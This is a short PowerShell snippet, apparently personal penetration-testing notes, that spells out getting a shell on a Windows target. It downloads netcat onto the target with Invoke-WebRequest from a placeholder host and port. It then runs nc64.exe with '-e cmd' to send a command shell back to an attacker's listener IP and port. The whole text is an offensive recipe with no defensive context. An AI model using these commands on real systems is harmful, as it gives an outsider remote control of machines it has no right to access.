
``` powershell
#ALLWAYS USE nc.exe or nc64.exe in /r2/pentest/netcat
#Transfer to target windows machine
Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <FILENAME>
#Run with cmd
.\nc64.exe <ATTACK_LISTENER_IP> <ATTACK_PORT> -e cmd
```